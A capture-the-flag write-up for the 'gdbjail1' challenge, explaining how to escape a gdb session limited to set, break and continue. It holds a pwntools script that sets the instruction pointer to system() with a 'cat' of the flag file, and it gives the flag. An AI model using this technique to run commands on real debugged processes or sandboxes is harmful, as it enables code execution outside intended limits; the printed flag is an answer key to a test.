https://ctftime.org/event/2396

# gdbjail1 (misc)

escape from gdb only using set, break and continue

## Solution

We can just set $rip to system, gdb will find the address for us.

```python
#!/usr/bin/env python3

from pwn import *

p = remote("gdbjail1.chal.imaginaryctf.org", 1337)

p.sendline('set $rip = system')
p.sendline('set $rdi = "cat /home/user/flag.txt"')
p.sendline('set $rsi = 0')
p.sendline('continue')
p.sendline('continue')
p.sendline('continue')

p.interactive()
```

## Flag
`ictf{n0_m0re_debugger_a2cd3018}`

shafouz 2024/07/21
